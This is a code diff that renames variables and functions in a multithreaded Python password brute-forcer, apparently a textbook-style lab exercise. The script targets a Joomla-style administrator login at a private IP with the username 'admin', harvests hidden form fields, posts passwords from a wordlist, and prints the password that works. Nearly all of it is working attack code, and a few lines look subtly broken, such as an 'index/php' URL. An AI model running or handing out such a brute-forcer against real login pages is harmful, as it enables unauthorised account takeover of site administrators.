@@ -7,27 +7,26 @@ import sys
 import queue
 import html.parser
 import http.cookiejar
-from BruteForceContent import build_wordlist
+from BruteForceContent import buildWords
 
-user_thread = 10
+noThreads = 10
 
 # set username, wordslist here and then run
 username = "admin"
-wordlist_file = "/tmp/cain.txt"
-
+wordsFile = "/tmp/cain.txt"
 
 resume = None
 
 # where script will donload and parse HTML
-target_url = "http://192.168.112.131/administrator/index/php"
+targetAddr = "http://192.168.112.131/administrator/index/php"
 # where we will submit brute-forcing attempt
-target_post = "http://192.168.112.131/administrator/index.php"
+targetSubmit = "http://192.168.112.131/administrator/index.php"
 
 username_field = "username"
 password_field = "passwd"
 
 # string to check for to see if we are successful
-success_check = "Administration - Control Panel"
+successString = "Administration - Control Panel"
 
 
 class Bruter:
@@ -38,13 +37,13 @@ class Bruter:
 
         print("Finished setting up for: %s" % username)
 
-    def run_bruteforce(self):
+    def startThreads(self):
 
-        for i in range(user_thread):
-            t = threading.Thread(target=self.web_bruter)
+        for i in range(noThreads):
+            t = threading.Thread(target=self.bruteWebs)
             t.start()
 
-    def web_bruter(self):
+    def bruteWebs(self):
 
         while not self.password_q.empty() and not self.found:
             brute = self.password_q.get().rstrip()
@@ -56,7 +55,7 @@ class Bruter:
             opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
 
             # initial request to get login form
-            response = opener.open(target_url)
+            response = opener.open(targetAddr)
             page = response.read()
 
             print("Trying %s : %s (%d left)" % (self.username, brute, self.password_q.qsize()))
@@ -71,17 +70,18 @@ class Bruter:
             post_tags[password_field] = brute
 
             login_data = urllib.parse.urlencode(post_tags)
-            login_response = opener.open(target_post, login_data)
+            login_response = opener.open(targetSubmit, login_data)
 
             login_result = login_response.read()
 
-            if success_check in login_result:
+            if successString in login_result:
                 self.found = True
 
                 print("[*] Bruteforce successfull.")
                 print("[*] Username: %s" % username)
                 print("[*] Password: %s" % brute)
                 print("[*] Waiting for all threads to finish...")
+
 
 class BruteParser(HTMLParser):
     def __init__(self):
@@ -103,7 +103,7 @@ class BruteParser(HTMLParser):
                 self.tag_results[tag_name] = value
 
 
-words = build_wordlist(wordlist_file)
+words = buildWords(wordsFile)
 
 bruter_obj = Bruter(username, words)
-bruter_obj.run_bruteforce()
+bruter_obj.startThreads()
